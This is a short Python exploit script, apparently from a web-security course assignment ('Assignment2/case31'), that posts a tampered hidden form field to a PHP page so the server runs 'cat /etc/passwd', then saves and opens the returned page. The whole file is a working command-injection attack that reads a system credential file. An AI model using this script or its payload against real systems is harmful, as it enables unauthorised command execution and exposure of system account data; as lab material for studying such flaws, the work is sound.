import requests
import webbrowser

# Exploit: change the hidden field 'cmd_url to 'cat /etc/passwd'
# Remote Code Execution

def main():
    temp = '/tmp/case31.html'
    payload = {'cmd_url':'cat /etc/passwd'}
    r = requests.post('http://wsb.com/Assignment2/case31.php', data=payload)
    with open(temp, 'wb') as f:
        f.write(r.content)
    webbrowser.open(temp, 2)

if __name__ == "__main__":
    main()
